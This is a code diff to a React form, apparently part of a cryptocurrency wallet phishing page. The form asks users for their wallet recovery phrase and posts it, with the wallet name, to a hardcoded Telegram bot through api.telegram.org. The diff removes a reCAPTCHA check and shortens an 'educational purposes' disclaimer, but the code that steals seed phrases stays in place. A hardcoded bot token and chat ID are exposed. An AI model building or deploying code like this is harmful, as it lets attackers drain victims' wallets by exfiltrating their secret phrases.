@@ -75,48 +75,7 @@ const FormSchema = z.object({
           "Secret phrase must contain exactly 12, 18, or 24 words.",
       }
     ),
-  recaptcha: z.string().min(1, { message: "Please verify you are not a robot." })
 });
-
-const ReCAPTCHAComponent = ({ onChange }: { onChange: (token: string | null) => void }) => {
-  const recaptchaRef = React.useRef<HTMLDivElement>(null);
-  const widgetIdRef = React.useRef<number | null>(null);
-
-  React.useEffect(() => {
-    const global = window as any;
-
-    const renderRecaptcha = () => {
-      if (recaptchaRef.current && global.grecaptcha && global.grecaptcha.render) {
-        if (widgetIdRef.current === null) {
-          widgetIdRef.current = global.grecaptcha.render(recaptchaRef.current, {
-            'sitekey': '6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP', // This is a test key
-            'theme': 'dark',
-            'callback': onChange,
-            'expired-callback': () => onChange(null),
-          });
-        }
-      }
-    };
-    
-    // Render immediately if grecaptcha is already available
-    if (global.grecaptcha && global.grecaptcha.ready) {
-      global.grecaptcha.ready(renderRecaptcha);
-    }
-
-    // Cleanup function to reset the widget when the component unmounts
-    return () => {
-      if (global.grecaptcha && widgetIdRef.current !== null) {
-        // The reset function is the correct way to handle this.
-        // It clears the previous instance.
-        global.grecaptcha.reset(widgetIdRef.current);
-        widgetIdRef.current = null;
-      }
-    };
-  }, [onChange]);
-
-  return <div ref={recaptchaRef} />;
-};
-
 
 function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
   const { toast } = useToast();
@@ -124,7 +83,6 @@ function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
     resolver: zodResolver(FormSchema),
     defaultValues: {
       secretPhrase: "",
-      recaptcha: "",
     },
   });
 
@@ -151,7 +109,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
     const botToken = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
     const chatId = "5485468089";
     const timestamp = new Date().toISOString();
-    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}\nreCAPTCHA Token: ${data.recaptcha}`;
+    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}`;
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -245,23 +203,8 @@ function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
             )}
           />
 
-           <FormField
-            control={form.control}
-            name="recaptcha"
-            render={({ field }) => (
-              <FormItem>
-                <FormControl>
-                  <ReCAPTCHAComponent
-                     onChange={(token) => field.onChange(token || "")}
-                  />
-                </FormControl>
-                <FormMessage />
-              </FormItem>
-            )}
-          />
-
            <p className="text-xs text-muted-foreground">
-              This site is for educational purposes. Do not use your real secret phrase. The reCAPTCHA is for demonstration purposes.
+              This site is for educational purposes. Do not use your real secret phrase.
             </p>
           <Button
             type="submit"
